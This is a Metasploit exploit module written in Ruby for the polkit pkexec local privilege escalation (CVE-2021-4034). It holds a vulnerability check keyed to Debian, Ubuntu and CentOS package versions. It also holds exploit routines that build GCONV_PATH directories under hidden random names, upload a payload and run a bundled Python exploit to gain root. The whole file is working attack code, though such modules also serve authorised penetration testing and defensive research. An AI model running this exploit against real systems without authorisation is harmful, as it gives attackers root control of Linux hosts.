##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Local Privilege Escalation in polkits pkexec',
        'Description' => %q{
          A local privilege escalation vulnerability was found on polkit's pkexec utility.
          The pkexec application is a setuid tool designed to allow unprivileged the
          current version of pkexec doesn't handle the calling parameters count correctly
          and ends trying to execute environment variables as commands.

          An attacker can leverage this by crafting environment variables
          in such a way it'll induce pkexec to execute arbitrary code. When successfully
          executed the attack can cause a local privilege escalation given unprivileged
          users administrative rights on the target machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Qualys Security', # Original vulnerability discovery
          'Andris Raugulis', # Exploit writeup and PoC
          'Dhiraj Mishra'    # Metasploit Module
        ],
        'DisclosureDate' => '2022-01-25',
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [
          [
            'x86_64',
            {
              'Arch' => [ ARCH_X64 ]
            }
          ],
          [
            'aarch64',
            {
              'Arch' => [ ARCH_AARCH64 ]
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => { 'PrependSetgid' => true, 'PrependSetuid' => true },
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2021-4034' ],
          [ 'URL', 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt' ],
          [ 'URL', 'https://github.com/arthepsy/CVE-2021-4034' ] # PoC Reference
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_advanced_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
      OptString.new('PkexecPath', [ false, 'The path to pkexec binary', '' ])
    ])
  end

  def find_pkexec
    pkexec_possibilities = 'pkexec', '/usr/bin/pkexec'
    pkexec_possibilities.each do |pkexec|
      vprint_status("Checking for #{pkexec}")
      if exists? pkexec
        vprint_status("Found pkexec here: #{pkexec}")
        return pkexec
      end
    end
    return nil
  end

  def check
    # Is the arch supported?
    arch = kernel_hardware
    vprint_status("Found kernel hardware #{kernel_hardware}")
    unless arch.include?('x86_64') || arch.include?('aarch64')
      return CheckCode::Safe("System architecture #{arch} is not supported")
    end

    # check the binary
    pkexec_path = datastore['PkexecPath']
    if pkexec_path.empty?
      pkexec_path = find_pkexec
    end
    if pkexec_path.nil?
      return CheckCode::Safe('The pkexec binary was not found; try populating PkexecPath')
    end

    version_output = cmd_exec("#{pkexec_path} --version")
    version_array = version_output.split(' ')
    if version_array.length < 3
      return CheckCode::Safe("unable to determine pkexec version from string: #{version_output}")
    end

    pkexec_version = Rex::Version.new(version_array[2])
    vprint_status("Found pkexec version #{pkexec_version}")
    # Is is protected with a patch?
    return CheckCode::Safe('The pkexec binary setuid is not set') unless setuid?(pkexec_path)

    # Is the Distro supported?
    sysinfo = get_sysinfo

    # If the target is Ubuntu...
    if sysinfo[:distro] =~ /[dD]ebian/
      vprint_status('Determined host os is Debian')
      package_data = cmd_exec('dpkg -s policykit-1')
      pulled_version = Rex::Version.new(package_data.scan(/Version:\s(.*)/)[0][0])
      vprint_status("pulled_version = #{pulled_version}")
      if sysinfo[:version] =~ /9/
        vulnerable_version = Rex::Version.new('0.105-18')
      elsif sysinfo[:version] =~ /10/
        vulnerable_version = Rex::Version.new('0.105-25')
      elsif sysinfo[:version] =~ /11/
        vulnerable_version = Rex::Version.new('0.105-31')
      else
        return CheckCode::Safe("Debian #{sysinfo[:version]} is not supported")
      end
      if pulled_version <= vulnerable_version
        return CheckCode::Appears
      end
    end
    if sysinfo[:distro] =~ /[uU]buntu/
      vprint_status('Determined host os is Ubuntu')
      package_data = cmd_exec('dpkg -s policykit-1')
      pulled_version = Rex::Version.new(package_data.scan(/Version:\s(.*)/)[0][0])
      vprint_status("pulled_version = #{pulled_version}")
      if sysinfo[:version] =~ /18.04/
        vulnerable_version = Rex::Version.new('0.105-20')
      elsif sysinfo[:version] =~ /20.04/
        vulnerable_version = Rex::Version.new('0.105-26')
      elsif sysinfo[:version] =~ /21.10/
        vulnerable_version = Rex::Version.new('0.105-31')
      else
        return CheckCode::Safe("Ubuntu #{sysinfo[:distro]} is not supported")
      end
      if pulled_version <= vulnerable_version
        return CheckCode::Appears
      end
    end
    if sysinfo[:distro] =~ /[cC]entos/
      vprint_status('Determined host os is CentOS')
      package_data = cmd_exec('rpm -qa | grep polkit')
      vulnerable_versions = exploit_data('CVE-2021-4034', 'vuln-centos-versions.txt')
      vulnerable_list = vulnerable_versions.split("\n")
      vulnerable_list.each do |vulnerable|
        if package_data.include?(vulnerable)
          return CheckCode::Appears
        end
      end
    end
    if sysinfo[:distro] =~ /[fF]edora/
      vprint_status('Determined host os is Fedora')
      return CheckCode::Safe('Fedora is not supported')
    end
    return CheckCode::Safe('Unsupported distro found')
  end

  def find_exec_program
    return 'python' if command_exists?('python')
    return 'python3' if command_exists?('python3')

    return nil
  end

  def exploit
    if is_root? && !datastore['ForceExploit']
      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
    end

    pkexec_path = datastore['PkexecPath']
    if pkexec_path.empty?
      pkexec_path = find_pkexec
    end

    python_binary = find_exec_program

    # Do we have the pkexec binary?
    if pkexec_path.nil?
      fail_with Failure::NotFound, 'The pkexec binary was not found; try populating PkexecPath'
    end

    # Do we have the python binary?
    if python_binary.nil?
      fail_with Failure::NotFound, 'The python binary was not found; try populating PythonPath'
    end

    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end

    local_dir = ".#{Rex::Text.rand_text_alpha_lower(6..12)}"
    working_dir = "#{datastore['WritableDir']}/#{local_dir}"
    mkdir(working_dir)
    register_dir_for_cleanup(working_dir)

    random_string_1 = Rex::Text.rand_text_alpha_lower(6..12).to_s
    random_string_2 = Rex::Text.rand_text_alpha_lower(6..12).to_s
    old_wd = pwd
    cd(working_dir)
    cmd_exec('mkdir -p GCONV_PATH=.')
    cmd_exec("touch GCONV_PATH=./#{random_string_1}")
    cmd_exec("chmod a+x GCONV_PATH=./#{random_string_1}")
    cmd_exec("mkdir -p #{random_string_1}")

    payload_file = "#{working_dir}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"
    vprint_status('generating payload')
    upload_and_chmodx(payload_file.to_s, generate_payload_dll)
    vprint_status('generating payload')
    register_file_for_cleanup(payload_file)

    exploit_file = "#{working_dir}/.#{Rex::Text.rand_text_alpha_lower(6..12)}"

    write_file(exploit_file, exploit_data('CVE-2021-4034', 'cve_2021_4034.py'))
    register_file_for_cleanup(exploit_file)

    cmd = "#{python_binary} #{exploit_file} #{pkexec_path} #{payload_file} #{random_string_1} #{random_string_2}"
    vprint_status("Running #{cmd}")
    output = cmd_exec(cmd)
    vprint_status(output)
    cd(old_wd)
    print_status("Verify cleanup of #{working_dir}")
  end
end
